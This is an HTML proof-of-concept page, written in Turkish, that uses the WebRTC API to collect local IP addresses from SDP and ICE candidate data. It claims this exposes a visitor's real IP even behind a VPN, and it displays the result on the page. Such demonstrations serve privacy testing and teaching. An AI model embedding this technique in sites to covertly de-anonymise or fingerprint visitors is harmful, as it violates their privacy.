<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>WebRTC IP Zafiyeti PoC</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1e1e1e; color: #fff; padding: 30px; }
        .container { background-color: #2d2d2d; padding: 20px; border-radius: 8px; max-width: 600px; margin: auto; }
        h2 { color: #00d2ff; }
        .ip-box { background-color: #111; padding: 15px; font-size: 1.2em; border-left: 5px solid #ff4757; font-family: monospace; }
        .highlight { color: #ff4757; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>macOS WebRTC IP Sızıntısı (PoC)</h2>
    <p>Bu kod, tarayıcının yerleşik WebRTC API'sini kullanarak STUN sunucularına veya doğrudan ağa istek atar ve <strong>VPN arkasında olsanız dahi</strong> gerçek ağ arayüzü IP adresinizi ifşa eder.</p>
    
    <div class="ip-box">
        Tespit Edilen IP: <span id="ip-address" class="highlight">Aranıyor...</span>
    </div>
</div>

<script>
    function findLocalIP(onNewIP) {
        // Tarayıcı uyumluluğu için WebRTC bağlantı nesnesini tanımla
        var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        
        if (!myPeerConnection) {
            onNewIP("WebRTC bu tarayıcıda desteklenmiyor.");
            return;
        }

        // STUN sunucularını atlayarak sadece yerel ağ adaylarını (ICE candidates) çekmek için boş ayar
        var pc = new myPeerConnection({iceServers: []});
        var noop = function() {};
        var localIPs = {};
        
        // IP adresini yakalamak için Regex
        var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;

        // Sahte bir veri kanalı aç
        pc.createDataChannel("");

        // Bir teklif (Offer) oluştur. SDP (Session Description Protocol) içindeki IP verisini ayıkla.
        pc.createOffer().then(function(sdp) {
            sdp.sdp.split('\n').forEach(function(line) {
                if (line.indexOf('candidate') < 0) return;
                var match = line.match(ipRegex);
                if (match) {
                    match.forEach(onNewIP);
                }
            });
            pc.setLocalDescription(sdp, noop, noop);
        }).catch(function(reason) {
            console.error("SDP Teklifi oluşturulamadı: ", reason);
        });

        // Yeni bir ICE adayı bulunduğunda tetiklenir
        pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            var match = ice.candidate.candidate.match(ipRegex);
            if (match) {
                onNewIP(match[0]);
            }
        };
    }

    // IP bulunduğunda ekrana yazdır
    findLocalIP(function(ip) {
        var ipDisplay = document.getElementById('ip-address');
        if (ipDisplay.innerText === "Aranıyor...") {
            ipDisplay.innerText = ip;
        } else if (!ipDisplay.innerText.includes(ip)) {
            ipDisplay.innerText += ", " + ip;
        }
    });
</script>

</body>
</html>
